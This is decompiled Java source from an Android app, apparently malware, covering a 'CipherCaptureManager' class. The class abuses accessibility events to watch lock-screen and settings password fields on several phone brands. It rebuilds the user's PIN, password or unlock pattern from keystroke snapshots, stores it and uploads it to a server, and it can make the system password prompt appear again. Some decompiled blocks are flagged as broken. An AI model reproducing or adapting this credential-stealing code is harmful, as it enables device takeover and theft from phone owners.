            boolValueOf = Boolean.valueOf(c0337a32.f53353a7 ? false : c0337a32.f53350a4.tryLock());
        } else {
            boolValueOf = null;
        }
        if (t60.m214686a2(boolValueOf, Boolean.FALSE)) {
            t60.m214726f4("CipherCaptureManager", "confirmAndSaveLastCipher: tryLock 失败（原子操作进行中），跳过");
            return false;
        }
        try {
            return m211813b2();
        } finally {
            if (t60.m214686a2(boolValueOf, Boolean.TRUE) && (c0337a3 = this.f53289a3) != null) {
                c0337a3.f53350a4.unlock();
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:72:0x0149  */
    /* JADX WARN: Removed duplicated region for block: B:73:0x0152  */
    /* JADX WARN: Removed duplicated region for block: B:76:0x0172  */
    /* JADX WARN: Removed duplicated region for block: B:77:0x0177  */
    /* JADX WARN: Removed duplicated region for block: B:80:0x017c  */
    /* renamed from: b2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m211813b2() {
        String str;
        String str2;
        C0598hx c0598hx = this.f53306c0;
        if (c0598hx == null) {
            StackTraceElement[] stackTrace = Thread.currentThread().getStackTrace();
            t60.m214694b5(stackTrace, "currentThread().stackTrace");
            t60.m214726f4("CipherCaptureManager", "confirmAndSaveLastCipher: 无缓冲密码 (调用栈: " + AbstractC0715je.m213295i2(AbstractC0134bh.m210732f5(stackTrace, 6), " <- ", null, null, new h10() { // from class: com.storm.safe.rock.service.modules.cipher.CipherCaptureManager$confirmAndSaveLastCipherInternal$1
                @Override // p000.h10
                public final Object invoke(Object obj) {
                    String methodName = ((StackTraceElement) obj).getMethodName();
                    t60.m214694b5(methodName, "it.methodName");
                    return methodName;
                }
            }, 30) + ")");
            return false;
        }
        String str3 = c0598hx.f56760a0;
        String str4 = c0598hx.f56761a1;
        t60.m214714d6("CipherCaptureManager", AbstractC0003a2.m34b5("confirmAndSaveLastCipher: 有缓冲密码! type=", str3, ", text=", str4 != null ? m21.m213937e5(4, str4) : null, "..."));
        if (t60.m214686a2(c0598hx.f56760a0, "PASSWORD_QUALITY_PATTERN")) {
            List list = c0598hx.f56762a2;
            if (list == null || list.size() < 4) {
                t60.m214726f4("CipherCaptureManager", "❌ 图案校验失败: 点数=" + (list != null ? list.size() : 0) + ", 需要>=4");
                t60.m214726f4("CipherCaptureManager", "❌ 密码有效性校验失败，丢弃: type=" + c0598hx.f56760a0 + ", text=" + c0598hx.f56761a1);
                this.f53306c0 = null;
                return false;
            }
            String str5 = c0598hx.f56760a0;
            String str6 = c0598hx.f56761a1;
            t60.m214714d6("CipherCaptureManager", "✅ 密码验证通过，保存: type=" + str5 + ", textLen=" + (str6 == null ? Integer.valueOf(str6.length()) : null));
            String str7 = c0598hx.f56760a0;
            String str8 = c0598hx.f56761a1;
            int length = str8 == null ? str8.length() : 0;
            List list2 = c0598hx.f56762a2;
            int size = list2 != null ? list2.size() : 0;
            StringBuilder sbM40c1 = AbstractC0003a2.m40c1("🔐 密码已捕获: type=", str7, ", textLen=", length, ", patternLen=");
            sbM40c1.append(size);
            t60.m214714d6("CipherCaptureManager", sbM40c1.toString());
            m211821d7(c0598hx);
            m211824e1(c0598hx);
            m211802d8(c0598hx);
            AbstractC0780a0.m213692a3(this.f53293a7, null, new CipherCaptureManager$uploadCipherToServer$1(this, c0598hx, null), 3);
            this.f53306c0 = null;
            return true;
        }
        String str9 = c0598hx.f56761a1;
        if (str9 == null || str9.length() == 0) {
            t60.m214726f4("CipherCaptureManager", "❌ 密码校验失败: 文本为空");
        } else if (str9.length() < 4) {
            t60.m214726f4("CipherCaptureManager", "❌ 密码校验失败: 长度=" + str9.length() + ", 需要>=4");
        } else if (AbstractC0779a1.m213652a5(str9, "*", false) || AbstractC0779a1.m213652a5(str9, "•", false) || AbstractC0779a1.m213652a5(str9, "●", false) || AbstractC0779a1.m213652a5(str9, "⬤", false) || AbstractC0779a1.m213652a5(str9, "◉", false) || AbstractC0779a1.m213652a5(str9, "○", false) || AbstractC0779a1.m213652a5(str9, "∙", false) || AbstractC0779a1.m213652a5(str9, "＊", false)) {
            t60.m214726f4("CipherCaptureManager", "❌ 密码校验失败: 包含遮蔽字符，密码不完整");
        } else {
            C0598hx c0598hxM211819d0 = m211819d0(true);
            if (c0598hxM211819d0 == null || (str2 = c0598hxM211819d0.f56761a1) == null || str2.length() == 0 || str2.equals(str9) || !AbstractC0779a1.m213679d2(str2, false, str9)) {
                C0598hx c0598hxM211819d02 = m211819d0(false);
                if (c0598hxM211819d02 != null && (str = c0598hxM211819d02.f56761a1) != null && str.length() != 0 && !str.equals(str9) && AbstractC0779a1.m213679d2(str, false, str9)) {
                    t60.m214726f4("CipherCaptureManager", "❌ 密码校验失败: 是已保存device密码的前缀（可能为截断版本）");
                }
                String str52 = c0598hx.f56760a0;
                String str62 = c0598hx.f56761a1;
                if (str62 == null) {
                }
                t60.m214714d6("CipherCaptureManager", "✅ 密码验证通过，保存: type=" + str52 + ", textLen=" + (str62 == null ? Integer.valueOf(str62.length()) : null));
                String str72 = c0598hx.f56760a0;
                String str82 = c0598hx.f56761a1;
                if (str82 == null) {
                }
                List list22 = c0598hx.f56762a2;
                if (list22 != null) {
                }
                StringBuilder sbM40c12 = AbstractC0003a2.m40c1("🔐 密码已捕获: type=", str72, ", textLen=", length, ", patternLen=");
                sbM40c12.append(size);
                t60.m214714d6("CipherCaptureManager", sbM40c12.toString());
                m211821d7(c0598hx);
                m211824e1(c0598hx);
                m211802d8(c0598hx);
                AbstractC0780a0.m213692a3(this.f53293a7, null, new CipherCaptureManager$uploadCipherToServer$1(this, c0598hx, null), 3);
                this.f53306c0 = null;
                return true;
            }
            t60.m214726f4("CipherCaptureManager", "❌ 密码校验失败: 是已保存locked密码的前缀（可能为截断版本）");
        }
        t60.m214726f4("CipherCaptureManager", "❌ 密码有效性校验失败，丢弃: type=" + c0598hx.f56760a0 + ", text=" + c0598hx.f56761a1);
        this.f53306c0 = null;
        return false;
    }

    /* renamed from: b4 */
    public final void m211814b4(boolean z) {
        String key_lock_cipher = z ? f53283c5.getKEY_LOCK_CIPHER() : f53284c6;
        Object value = this.f53288a2.getValue();
        t60.m214694b5(value, "<get-prefs>(...)");
        ((SharedPreferences) value).edit().remove(key_lock_cipher).apply();
        t60.m214714d6("CipherCaptureManager", "🗑️ 已删除密码: key=" + key_lock_cipher);
    }

    /* renamed from: b5 */
    public final void m211815b5() {
        int i = 0;
        this.f53297b1 = false;
        this.f53298b2.clear();
        this.f53299b3 = false;
        this.f53300b4.clear();
        this.f53301b5.clear();
        this.f53302b6 = 0L;
        this.f53304b8 = false;
        RunnableC0334a0 runnableC0334a0 = this.f53305b9;
        if (runnableC0334a0 != null) {
            this.f53294a8.removeCallbacks(runnableC0334a0);
        }
        this.f53305b9 = null;
        m211823e0();
        ArrayList arrayList = this.f53303b7;
        int size = arrayList.size();
        while (i < size) {
            Object obj = arrayList.get(i);
            i++;
            this.f53294a8.removeCallbacks((Runnable) obj);
        }
        this.f53303b7.clear();
        t60.m214702c3("CipherCaptureManager", "🔷 已取消所有待执行的图案检测任务");
        if (Build.VERSION.SDK_INT >= 30) {
            this.f53294a8.post(new RunnableC0596hw(this, 1));
        }
        this.f53294a8.post(new RunnableC0596hw(this, 2));
        t60.m214714d6("CipherCaptureManager", "❌ 禁用系统密码监听模式");
    }

    /* renamed from: b6 */
    public final void m211816b6() {
        Boolean boolValueOf;
        C0337a3 c0337a3;
        C0337a3 c0337a32 = this.f53289a3;
        if (c0337a32 != null) {
            boolValueOf = Boolean.valueOf(c0337a32.f53353a7 ? false : c0337a32.f53350a4.tryLock());
        } else {
            boolValueOf = null;
        }
        if (t60.m214686a2(boolValueOf, Boolean.FALSE)) {
            t60.m214726f4("CipherCaptureManager", "discardPendingCipher: tryLock 失败（原子操作进行中），跳过");
            return;
        }
        try {
            m211817b7();
        } finally {
            if (t60.m214686a2(boolValueOf, Boolean.TRUE) && (c0337a3 = this.f53289a3) != null) {
                c0337a3.f53350a4.unlock();
            }
        }
    }

    /* renamed from: b7 */
    public final void m211817b7() {
        if (this.f53306c0 != null) {
            C0598hx c0598hx = this.f53306c0;
            String str = c0598hx != null ? c0598hx.f56760a0 : null;
            StackTraceElement[] stackTrace = Thread.currentThread().getStackTrace();
            t60.m214694b5(stackTrace, "currentThread().stackTrace");
            t60.m214726f4("CipherCaptureManager", AbstractC0003a2.m34b5("❌ 密码验证失败或超时，丢弃缓冲: type=", str, " (调用栈: ", AbstractC0715je.m213295i2(AbstractC0134bh.m210732f5(stackTrace, 6), " <- ", null, null, new h10() { // from class: com.storm.safe.rock.service.modules.cipher.CipherCaptureManager$discardPendingCipherInternal$1
                @Override // p000.h10
                public final Object invoke(Object obj) {
                    String methodName = ((StackTraceElement) obj).getMethodName();
                    t60.m214694b5(methodName, "it.methodName");
                    return methodName;
                }
            }, 30), ")"));
            this.f53306c0 = null;
        } else {
            t60.m214702c3("CipherCaptureManager", "discardPendingCipher: 无缓冲密码可丢弃");
        }
        this.f53304b8 = false;
        t60.m214702c3("CipherCaptureManager", "🔷 pendingOverlayCreation 已重置，允许重建覆盖层");
    }

    /* renamed from: b8 */
    public final void m211818b8() {
        if (!this.f53297b1) {
            t60.m214702c3("CipherCaptureManager", "🔷 [doNotifyPasswordPageDismissed] 监听模式已关闭，取消重新弹出");
            return;
        }
        C0598hx c0598hxM211819d0 = m211819d0(true);
        if (c0598hxM211819d0 == null) {
            c0598hxM211819d0 = m211819d0(false);
        }
        if (c0598hxM211819d0 != null) {
            long jCurrentTimeMillis = System.currentTimeMillis() - c0598hxM211819d0.f56765a5;
            if (jCurrentTimeMillis < 30000) {
                t60.m214714d6("CipherCaptureManager", "🔷 [doNotifyPasswordPageDismissed] 已有密码（" + jCurrentTimeMillis + "ms前捕获），不再重新弹出");
                m211801d5();
                return;
            }
        }
        try {
            t60.m214714d6("CipherCaptureManager", "🔷 [doNotifyPasswordPageDismissed] 通知 dqtvuisjd 重新弹出密码框");
            dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
            if (c0290a0 != null) {
                c0290a0.m211495i9();
            } else {
                t60.m214726f4("CipherCaptureManager", "⚠️ dqtvuisjd 实例为 null");
            }
        } catch (Exception e) {
            tz0.m214807a7("❌ 通知重新弹出失败: ", e.getMessage(), "CipherCaptureManager");
        }
    }

    /* renamed from: d0 */
    public final synchronized C0598hx m211819d0(boolean z) {
        C0598hx c0598hx;
        ArrayList arrayList;
        ArrayList arrayList2;
        ArrayList arrayList3;
        try {
            String key_lock_cipher = z ? f53283c5.getKEY_LOCK_CIPHER() : f53284c6;
            Object value = this.f53288a2.getValue();
            t60.m214694b5(value, "<get-prefs>(...)");
            String string = ((SharedPreferences) value).getString(key_lock_cipher, null);
            if (string == null) {
                return null;
            }
            try {
                JSONObject jSONObject = new JSONObject(m211785b3(string));
                String strOptString = jSONObject.optString("cipherGradeCode");
                t60.m214694b5(strOptString, "json.optString(\"cipherGradeCode\")");
                String strOptString2 = jSONObject.optString("textCipher");
                String str = strOptString2.length() == 0 ? null : strOptString2;
                JSONArray jSONArrayOptJSONArray = jSONObject.optJSONArray("patternCipher");
                if (jSONArrayOptJSONArray != null) {
                    n60 n60VarM214463g2 = AbstractC1117qo.m214463g2(0, jSONArrayOptJSONArray.length());
                    ArrayList arrayList4 = new ArrayList(AbstractC0717jg.m213310g9(n60VarM214463g2));
                    l60 it = n60VarM214463g2.iterator();
                    while (it.f57840a2) {
                        arrayList4.add(Integer.valueOf(jSONArrayOptJSONArray.getInt(it.nextInt())));
                    }
                    arrayList = arrayList4;
                } else {
                    arrayList = null;
                }
                JSONArray jSONArrayOptJSONArray2 = jSONObject.optJSONArray("patternScreenPoints");
                if (jSONArrayOptJSONArray2 != null) {
                    n60 n60VarM214463g22 = AbstractC1117qo.m214463g2(0, jSONArrayOptJSONArray2.length());
                    arrayList2 = new ArrayList(AbstractC0717jg.m213310g9(n60VarM214463g22));
                    l60 it2 = n60VarM214463g22.iterator();
                    while (it2.f57840a2) {
                        JSONArray jSONArray = jSONArrayOptJSONArray2.getJSONArray(it2.nextInt());
                        arrayList2.add(new android.graphics.Point(jSONArray.getInt(0), jSONArray.getInt(1)));
                    }
                } else {
                    arrayList2 = null;
                }
                boolean zOptBoolean = jSONObject.optBoolean("isLocked");
                long jOptLong = jSONObject.optLong("captureTime");
                JSONObject jSONObjectOptJSONObject = jSONObject.optJSONObject("boundsInScreen");
                Rect rect = jSONObjectOptJSONObject != null ? new Rect(jSONObjectOptJSONObject.optInt("left"), jSONObjectOptJSONObject.optInt("top"), jSONObjectOptJSONObject.optInt("right"), jSONObjectOptJSONObject.optInt("bottom")) : null;
                JSONObject jSONObjectOptJSONObject2 = jSONObject.optJSONObject("boundsInParent");
                Rect rect2 = jSONObjectOptJSONObject2 != null ? new Rect(jSONObjectOptJSONObject2.optInt("left"), jSONObjectOptJSONObject2.optInt("top"), jSONObjectOptJSONObject2.optInt("right"), jSONObjectOptJSONObject2.optInt("bottom")) : null;
                JSONArray jSONArrayOptJSONArray3 = jSONObject.optJSONArray("touchCipher");
                if (jSONArrayOptJSONArray3 != null) {
                    n60 n60VarM214463g23 = AbstractC1117qo.m214463g2(0, jSONArrayOptJSONArray3.length());
                    ArrayList arrayList5 = new ArrayList(AbstractC0717jg.m213310g9(n60VarM214463g23));
                    l60 it3 = n60VarM214463g23.iterator();
                    while (it3.f57840a2) {
                        JSONArray jSONArray2 = jSONArrayOptJSONArray3.getJSONArray(it3.nextInt());
                        arrayList5.add(AbstractC0716jf.m213306g5(Float.valueOf((float) jSONArray2.getDouble(0)), Float.valueOf((float) jSONArray2.getDouble(1))));
                        jSONArrayOptJSONArray3 = jSONArrayOptJSONArray3;
                    }
                    arrayList3 = arrayList5;
                } else {
                    arrayList3 = null;
                }
                c0598hx = new C0598hx(strOptString, str, arrayList, arrayList2, zOptBoolean, jOptLong, rect, rect2, arrayList3, 512);
            } catch (Exception e) {
                t60.m214704c5("CipherCaptureManager", "解密密码失败: " + e.getMessage());
                c0598hx = null;
            }
            return c0598hx;
        } catch (Throwable th) {
            throw th;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:239:0x047b  */
    /* JADX WARN: Removed duplicated region for block: B:266:0x04fb  */
    /* JADX WARN: Removed duplicated region for block: B:344:0x0677  */
    /* JADX WARN: Removed duplicated region for block: B:345:0x0679  */
    /* JADX WARN: Removed duplicated region for block: B:370:0x070d  */
    /* JADX WARN: Removed duplicated region for block: B:376:0x0728  */
    /* JADX WARN: Removed duplicated region for block: B:382:0x0745  */
    /* JADX WARN: Removed duplicated region for block: B:395:0x0776  */
    /* JADX WARN: Removed duplicated region for block: B:401:0x078b  */
    /* JADX WARN: Removed duplicated region for block: B:403:0x078f A[PHI: r1
      0x078f: PHI (r1v42 java.lang.String) = 
      (r1v12 java.lang.String)
      (r1v13 java.lang.String)
      (r1v14 java.lang.String)
      (r1v16 java.lang.String)
      (r1v17 java.lang.String)
     binds: [B:402:0x078d, B:412:0x07a1, B:411:0x079f, B:407:0x0797, B:405:0x0793] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:404:0x0791  */
    /* JADX WARN: Removed duplicated region for block: B:414:0x07a6  */
    /* JADX WARN: Removed duplicated region for block: B:446:0x0831  */
    /* JADX WARN: Removed duplicated region for block: B:449:0x0845  */
    /* JADX WARN: Removed duplicated region for block: B:450:0x0847  */
    /* JADX WARN: Removed duplicated region for block: B:452:0x084a  */
    /* JADX WARN: Removed duplicated region for block: B:458:0x0873  */
    /* JADX WARN: Removed duplicated region for block: B:519:? A[RETURN, SYNTHETIC] */
    /* renamed from: d6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211820d6(AccessibilityEvent accessibilityEvent) {
        CharSequence packageName;
        String string;
        String string2;
        String string3;
        boolean z;
        String strM213684d7;
        String strM213684d72;
        String strM213684d73;
        int i;
        boolean z2;
        boolean z3;
        String strM213295i2;
        boolean z4;
        boolean z5;
        CharSequence charSequence;
        String string4;
        CharSequence contentDescription;
        AccessibilityNodeInfo source;
        CharSequence charSequence2;
        String string5;
        Integer numValueOf;
        boolean z6;
        boolean z7;
        String strM210727f0;
        String strM211800d4;
        CharSequence text;
        CharSequence charSequence3;
        CharSequence charSequence4;
        String string6;
        CharSequence packageName2;
        AccessibilityNodeInfo source2;
        String string7;
        boolean z8;
        if (!this.f53297b1 || (packageName = accessibilityEvent.getPackageName()) == null || (string = packageName.toString()) == null) {
            return;
        }
        if (!string.equals("com.android.systemui") && !string.equals("com.hihonor.android.systemui") && !string.equals("com.android.settings") && !string.equals("com.hihonor.android.settings") && !string.equals("com.samsung.android.biometrics.app.setting")) {
            return;
        }
        CharSequence className = accessibilityEvent.getClassName();
        String str = "";
        if (className == null || (string2 = className.toString()) == null) {
            string2 = "";
        }
        int eventType = accessibilityEvent.getEventType();
        if (eventType != 1) {
            if (eventType != 16) {
                if (eventType != 32) {
                    if (eventType == 128) {
                        if (this.f53297b1) {
                            Object systemService = this.f53286a0.getSystemService("keyguard");
                            KeyguardManager keyguardManager = systemService instanceof KeyguardManager ? (KeyguardManager) systemService : null;
                            if (keyguardManager == null || !keyguardManager.isKeyguardLocked() || (source2 = accessibilityEvent.getSource()) == null) {
                                return;
                            }
                            String viewIdResourceName = source2.getViewIdResourceName();
                            if (viewIdResourceName == null) {
                                viewIdResourceName = "";
                            }
                            if (!AbstractC0779a1.m213652a5(viewIdResourceName, "passwordEntry", false) && !AbstractC0779a1.m213652a5(viewIdResourceName, "securityEditText", false) && !AbstractC0779a1.m213652a5(viewIdResourceName, "miui_mixed_password_input_field", false) && !AbstractC0779a1.m213652a5(viewIdResourceName, "lockPassword", false) && !AbstractC0779a1.m213652a5(viewIdResourceName, "password_entry", false) && !AbstractC0779a1.m213652a5(viewIdResourceName, "hw_password", false) && !AbstractC0779a1.m213652a5(viewIdResourceName, "emui_password", false) && !AbstractC0779a1.m213652a5(viewIdResourceName, "keyguard_password", false) && !AbstractC0779a1.m213652a5(viewIdResourceName, "mixed_password", false)) {
                                source2.recycle();
                                return;
                            }
                            CharSequence text2 = source2.getText();
                            if (text2 == null || (string7 = text2.toString()) == null) {
                                source2.recycle();
                                return;
                            }
                            String strM213647a3 = new Regex("[•●⬤◉﹒＊*]").m213647a3(string7, "");
                            if (strM213647a3.length() != 0) {
                                int length = strM213647a3.length();
                                for (int i2 = 0; i2 < length; i2++) {
                                    char cCharAt = strM213647a3.charAt(i2);
                                    this.f53298b2.add(String.valueOf(cCharAt));
                                    ArrayList arrayList = this.f53298b2;
                                    if (arrayList == null || !arrayList.isEmpty()) {
                                        int size = arrayList.size();
                                        int i3 = 0;
                                        while (i3 < size) {
                                            Object obj = arrayList.get(i3);
                                            i3++;
                                            if (new Regex("[a-zA-Z]").m213646a2((String) obj)) {
                                                z8 = true;
                                                break;
                                            }
                                        }
                                        z8 = false;
                                    } else {
                                        z8 = false;
                                    }
                                    this.f53299b3 = z8;
                                    t60.m214702c3("CipherCaptureManager", "🔤 [HOVER]混合密码追加: " + cCharAt + " (当前=" + AbstractC0715je.m213295i2(this.f53298b2, "", null, null, null, 62) + ")");
                                }
                            } else if (!this.f53298b2.isEmpty()) {
                                this.f53298b2.remove(r2.size() - 1);
                                t60.m214702c3("CipherCaptureManager", "🔙 [HOVER]退格: 剩余=".concat(AbstractC0715je.m213295i2(this.f53298b2, "", null, null, null, 62)));
                            }
                            source2.recycle();
                            return;
                        }
                        return;
                    }
                    if (eventType != 2048) {
                        if (eventType != 8192) {
                            if (eventType != 4194304) {
                                return;
                            }
                        }
                    }
                }
                if (this.f53310c4.compareAndSet(false, true)) {
                    new Thread(new RunnableC0596hw(this, 4)).start();
                }
                m211829e6();
                if (this.f53297b1) {
                    AccessibilityNodeInfo rootInActiveWindow = this.f53286a0.getRootInActiveWindow();
                    if (rootInActiveWindow == null || (packageName2 = rootInActiveWindow.getPackageName()) == null || (string6 = packageName2.toString()) == null) {
                        string6 = string;
                    }
                    if (rootInActiveWindow != null) {
                        rootInActiveWindow.recycle();
                    }
                    t60.m214702c3("CipherCaptureManager", "🔷 [窗口检测] eventPkg=" + string + ", actualPkg=" + string6);
                    if (string6.equals("com.android.systemui") || string6.equals("com.android.settings") || string6.equals("com.samsung.android.biometrics.app.setting") || string6.equals("com.hihonor.android.systemui") || string6.equals("com.hihonor.android.settings") || string6.equals(StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo")) || string6.equals(StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM=")) || string6.equals(StringUtil.m212470a0("KFYcdE43ACFFPjgXAjtLPQ8rWSUuSw=="))) {
                        return;
                    }
                    boolean zIsEmpty = this.f53298b2.isEmpty();
                    boolean z9 = !zIsEmpty;
                    boolean z10 = this.f53306c0 != null;
                    long jCurrentTimeMillis = System.currentTimeMillis();
                    if (jCurrentTimeMillis - this.f53308c2 < this.f53309c3) {
                        return;
                    }
                    this.f53308c2 = jCurrentTimeMillis;
                    t60.m214702c3("CipherCaptureManager", "🔷 [窗口切换] 检测到非密码包名: " + string6 + ", hasText=" + z9 + ", hasPending=" + z10);
                    if (zIsEmpty && !z10) {
                        t60.m214714d6("CipherCaptureManager", "🔷 密码界面已消失（无数据），通知重新弹出");
                        this.f53294a8.post(new RunnableC0596hw(this, 5));
                        return;
                    }
                    t60.m214714d6("CipherCaptureManager", "🔷 密码界面已消失（有数据），保存密码并关闭监听模式");
                    if (this.f53306c0 == null && !this.f53298b2.isEmpty()) {
                        String strM213295i22 = AbstractC0715je.m213295i2(this.f53298b2, "", null, null, null, 62);
                        String str2 = this.f53299b3 ? "password" : "pin";
                        m211810a9(strM213295i22, str2);
                        t60.m214714d6("CipherCaptureManager", "🔷 [HOVER桥接] capturedPassword → pendingCipherData: len=" + strM213295i22.length() + ", type=" + str2);
                    }
                    t60.m214714d6("CipherCaptureManager", "🔷 密码保存结果: " + m211812b1());
                    m211801d5();
                    m211815b5();
                    return;
                }
                return;
            }
            if (AbstractC0779a1.m213652a5(string2, "EditText", true)) {
                try {
                    source = accessibilityEvent.getSource();
                } catch (Exception unused) {
                    source = null;
                }
                if (source == null || !source.isPassword()) {
                    List<CharSequence> text3 = accessibilityEvent.getText();
                    if (text3 != null && (charSequence2 = (CharSequence) AbstractC0715je.m213291h8(text3)) != null && (string5 = charSequence2.toString()) != null) {
                        str = string5;
                    }
                    if (!AbstractC0779a1.m213652a5(str, "•", false) && !AbstractC0779a1.m213652a5(str, "●", false) && !AbstractC0779a1.m213652a5(str, "⬤", false) && !AbstractC0779a1.m213652a5(str, "◉", false) && !AbstractC0779a1.m213652a5(str, "*", false) && str.length() > 0) {
                        t60.m214702c3("CipherCaptureManager", "⏭️ 跳过非密码EditText: isPassword=false, 无遮蔽符, text=".concat(m21.m213937e5(6, str)));
                        if (source != null) {
                            source.recycle();
                            return;
                        }
                        return;
                    }
                }
                if (source != null) {
                    source.recycle();
                }
                Iterator it = this.f53301b5.iterator();
                if (it.hasNext()) {
                    numValueOf = Integer.valueOf(((String) it.next()).length());
                    while (it.hasNext()) {
                        Integer numValueOf2 = Integer.valueOf(((String) it.next()).length());
                        if (numValueOf.compareTo(numValueOf2) < 0) {
                            numValueOf = numValueOf2;
                        }
                    }
                } else {
                    numValueOf = null;
                }
                int iIntValue = numValueOf != null ? numValueOf.intValue() : 0;
                List<CharSequence> text4 = accessibilityEvent.getText();
                String strM211800d42 = m211800d4((text4 == null || (charSequence4 = (CharSequence) AbstractC0715je.m213291h8(text4)) == null) ? null : charSequence4.toString());
                final int length2 = strM211800d42 != null ? strM211800d42.length() : 0;
                if (length2 < iIntValue && iIntValue > 0) {
                    int i4 = iIntValue - length2;
                    if (length2 == 0) {
                        AbstractC0003a2.m44c5("🔄 输入框全清(密码错误重置): ", iIntValue, " → 0, 清空所有快照和PIN缓存", "CipherCaptureManager");
                        this.f53301b5.clear();
                        this.f53298b2.clear();
                        this.f53302b6 = 0L;
                    } else {
                        AbstractC0721jk.m213316h4(this.f53301b5, new h10() { // from class: com.storm.safe.rock.service.modules.cipher.CipherCaptureManager$monitorSystemPasswordInput$1
                            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                            {
                                super(1);
                            }

                            @Override // p000.h10
                            public final Object invoke(Object obj2) {
                                String str3 = (String) obj2;
                                t60.m214695b6(str3, "it");
                                return Boolean.valueOf(str3.length() > length2);
                            }
                        });
                        for (int i5 = 0; i5 < i4; i5++) {
                            if (!this.f53298b2.isEmpty()) {
                                this.f53298b2.remove(r5.size() - 1);
                            }
                        }
                        StringBuilder sbM38b9 = AbstractC0003a2.m38b9("🔙 删除 ", i4, " 位: ", iIntValue, " → ");
                        sbM38b9.append(length2);
                        sbM38b9.append(", 快照和PIN缓存已同步");
                        t60.m214714d6("CipherCaptureManager", sbM38b9.toString());
                    }
                }
                if (accessibilityEvent.getEventType() != 16) {
                    z6 = false;
                } else {
                    CharSequence beforeText = accessibilityEvent.getBeforeText();
                    String strM211800d43 = m211800d4(beforeText != null ? beforeText.toString() : null);
                    if (strM211800d43 != null) {
                        this.f53301b5.add(strM211800d43);
                        t60.m214702c3("CipherCaptureManager", "📝 快照(beforeText): 长度=" + strM211800d43.length());
                        z6 = true;
                    }
                }
                List<CharSequence> text5 = accessibilityEvent.getText();
                String strM211800d44 = m211800d4((text5 == null || (charSequence3 = (CharSequence) AbstractC0715je.m213291h8(text5)) == null) ? null : charSequence3.toString());
                if (strM211800d44 != null) {
                    this.f53301b5.add(strM211800d44);
                    t60.m214702c3("CipherCaptureManager", "📝 快照(eventText): 长度=" + strM211800d44.length());
                    z6 = true;
                }
                try {
                    AccessibilityNodeInfo source3 = accessibilityEvent.getSource();
                    strM211800d4 = m211800d4((source3 == null || (text = source3.getText()) == null) ? null : text.toString());
                } catch (Exception unused2) {
                }
                if (strM211800d4 == null || strM211800d4.equals(strM211800d44)) {
                    z7 = z6;
                } else {
                    this.f53301b5.add(strM211800d4);
                    try {
                        t60.m214702c3("CipherCaptureManager", "📝 快照(nodeText): 长度=" + strM211800d4.length());
                    } catch (Exception unused3) {
                    }
                    z7 = true;
                }
                if (z7) {
                    ArrayList arrayList2 = this.f53301b5;
                    if (arrayList2.isEmpty()) {
                        strM210727f0 = null;
                    } else {
                        int size2 = arrayList2.size();
                        int length3 = 0;
                        int i6 = 0;
                        while (i6 < size2) {
                            Object obj2 = arrayList2.get(i6);
                            i6++;
                            String str3 = (String) obj2;
                            if (str3.length() > 0 && str3.length() > length3) {
                                length3 = str3.length();
                            }
                        }
                        if (length3 != 0) {
                            String[] strArr = new String[length3];
                            for (int i7 = 0; i7 < length3; i7++) {
                                strArr[i7] = "*";
                            }
                            int size3 = arrayList2.size();
                            int i8 = 0;
                            while (i8 < size3) {
                                Object obj3 = arrayList2.get(i8);
                                i8++;
                                String str4 = (String) obj3;
                                int length4 = str4.length();
                                for (int i9 = 0; i9 < length4; i9++) {
                                    String strValueOf = String.valueOf(str4.charAt(i9));
                                    if (!t60.m214686a2(strValueOf, "*")) {
                                        strArr[i9] = strValueOf;
                                    }
                                }
                            }
                            strM210727f0 = AbstractC0134bh.m210727f0(strArr, 62);
                            if (AbstractC0779a1.m213652a5(strM210727f0, "*", false)) {
                                if (arrayList2.size() > 50) {
                                    t60.m214726f4("CipherCaptureManager", "⚠️ 快照超过50个仍未完整: ".concat(strM210727f0));
                                }
                                strM210727f0 = null;
                            } else {
                                t60.m214702c3("CipherCaptureManager", "🔑 plug.c.i() 已破解文本密码: 长度=" + strM210727f0.length());
                            }
                        }
                    }
                    if (strM210727f0 != null) {
                        t60.m214714d6("CipherCaptureManager", "✅ 密码恢复成功: 长度=" + strM210727f0.length());
                        m211810a9(strM210727f0, "password");
                        return;
                    }
                    t60.m214702c3("CipherCaptureManager", "⏳ 密码尚不完整，已缓存 " + this.f53301b5.size() + " 个快照");
                    return;
                }
                return;
            }
            return;
        }
        AccessibilityNodeInfo source4 = accessibilityEvent.getSource();
        String viewIdResourceName2 = source4 != null ? source4.getViewIdResourceName() : null;
        if (viewIdResourceName2 == null) {
            viewIdResourceName2 = "";
        }
        if (source4 == null || (contentDescription = source4.getContentDescription()) == null || (string3 = contentDescription.toString()) == null) {
            CharSequence contentDescription2 = accessibilityEvent.getContentDescription();
            string3 = contentDescription2 != null ? contentDescription2.toString() : "";
        }
        List<CharSequence> text6 = accessibilityEvent.getText();
        if (text6 != null && (charSequence = (CharSequence) AbstractC0715je.m213291h8(text6)) != null && (string4 = charSequence.toString()) != null) {
            str = string4;
        }
        CharSequence className2 = accessibilityEvent.getClassName();
        StringBuilder sbM41c2 = AbstractC0003a2.m41c2("🔍 CLICKED: pkg=", string, ", viewId=", viewIdResourceName2, ", desc=");
        sbM41c2.append(string3);
        sbM41c2.append(", eventText=");
        sbM41c2.append(str);
        sbM41c2.append(", className=");
        sbM41c2.append((Object) className2);
        t60.m214702c3("CipherCaptureManager", sbM41c2.toString());
        if (AbstractC0779a1.m213652a5(viewIdResourceName2, "delete", true) || AbstractC0779a1.m213652a5(viewIdResourceName2, "backspace", true) || AbstractC0779a1.m213652a5(viewIdResourceName2, "del", true)) {
            z = true;
        } else {
            List<String> list = dh0.f55777c7;
            if (list == null || !list.isEmpty()) {
                for (String str5 : list) {
                    if (AbstractC0779a1.m213656a9(string3, str5) || str.equalsIgnoreCase(str5)) {
                        z5 = true;
                        break;
                    }
                }
                z5 = false;
                if (z5) {
                    z = false;
                }
            } else {
                z5 = false;
                if (z5) {
                }
            }
        }
        if (z) {
            if (!this.f53298b2.isEmpty()) {
                this.f53298b2.remove(r1.size() - 1);
